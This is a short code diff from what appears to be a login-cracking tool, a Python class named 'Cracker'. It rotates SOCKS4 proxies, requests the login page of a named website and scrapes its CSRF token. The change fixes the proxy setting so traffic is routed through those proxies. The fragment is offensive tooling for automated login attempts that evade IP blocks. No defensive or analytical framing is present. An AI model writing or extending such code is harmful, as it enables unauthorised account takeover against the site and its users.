@@ -26,7 +26,7 @@ class Cracker:
         self.proxy = self.proxylist.pop()
 
         try:
-            r.proxies = {'socks4': 'socks4://' + self.proxy}
+            r.proxies = {'https': 'socks4://' + self.proxy}
             data = r.get('https://shadowservants.ru/login', timeout=5).text
             reg = re.findall(r'<meta name=\"csrf_token\" content=\"[A-Za-z0-9.-]+\" />', data)
             if len(str(reg)) < 3:
